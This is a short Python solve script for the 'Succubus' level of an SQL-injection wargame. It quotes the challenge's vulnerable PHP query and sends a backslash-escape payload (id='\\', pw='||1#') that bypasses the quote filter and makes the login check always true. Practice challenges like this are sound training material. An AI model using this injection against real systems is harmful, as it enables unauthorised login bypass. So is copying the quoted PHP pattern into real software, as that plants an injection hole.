#!/usr/bin/env python3
import los


def main():
    '''
    Succubus

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/\'/',$_GET[id])) exit("HeHe");
    if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
    $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) solve("succubus"); 
    '''

    url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php"
    cook = los.check_cookies(url)

    param = dict(id='\\', pw='||1#')

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Succubus Clear!')


if __name__ == '__main__':
    main()
